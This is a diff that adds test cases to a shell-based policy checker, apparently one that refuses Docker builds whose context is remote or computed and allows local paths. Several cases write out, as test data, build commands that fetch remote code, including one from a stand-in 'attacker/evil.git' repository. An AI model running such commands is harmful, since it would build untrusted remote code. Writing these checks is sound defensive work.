@@ -1055,5 +1055,14 @@ case_ n21-tag-variable-src-ok  ok  "$(rb 'docker tag "${repo}@${d}" "fa-${v}"; d
 case_ n22-archive-to-daemon-run bad "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; docker run img:1')"
 case_ n22-archive-scan-ok      ok  "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; grype docker:img:1; docker scout cves local://img:1')"
 case_ n22-pinned-to-daemon-ok   ok  "$(rb 'skopeo copy docker://alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 docker-daemon:img:1; docker run img:1')"
+# --- Sonnet #164 r15 (NEW-23): a build's context must be a local path; remote or computed contexts are refused
+case_ n23-git-url-context      bad "$(r 'docker build https://github.com/attacker/evil.git -f go.mod -t x')" "touch go.mod; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n23-git-scheme-context   bad "$(r 'docker build git://example.org/r.git -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n23-git-ssh-context      bad "$(r 'docker build git@github.com:a/b.git -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n23-tarball-url-context  bad "$(r 'docker buildx build https://x.example/ctx.tar.gz -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n23-variable-context     bad "$(rb 'docker build -t x "$CTX"')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n23-build-context-image  bad "$(r 'docker buildx build --build-context base=docker-image://alpine:latest -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n23-build-context-local-ok ok "$(r 'docker buildx build --build-context src=./src -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
+case_ n23-local-subdir-ok      ok  "$(r 'docker build -f build/Dockerfile -t x build')" "mkdir -p build; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile"
 echo "check-action-pins: $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
